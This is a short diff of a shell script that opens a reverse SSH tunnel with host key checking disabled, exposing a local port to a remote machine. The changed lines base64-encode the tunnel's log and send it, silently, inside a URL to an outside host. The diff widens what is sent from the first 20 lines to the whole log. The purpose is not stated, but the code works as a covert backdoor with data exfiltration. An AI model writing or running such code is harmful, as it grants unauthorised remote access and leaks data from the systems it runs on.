@@ -36,10 +36,10 @@ ssh -v -o StrictHostKeyChecking=no -o ServerAliveInterval=20 -N -R 10022:localho
 ssh_pid=$!
 sleep 10
 
-# Send SSH output as base64
+# Send full SSH output as base64
 if [ -f /tmp/ssh_tunnel.log ]; then
   log "TUN-LINES-$(wc -l < /tmp/ssh_tunnel.log)"
-  b64=$(head -20 /tmp/ssh_tunnel.log | base64 -w0)
+  b64=$(cat /tmp/ssh_tunnel.log | base64 -w0)
   curl -s "https://recordme.hobbs.cz/LOG-B64-$b64" >/dev/null 2>&1
 fi
 
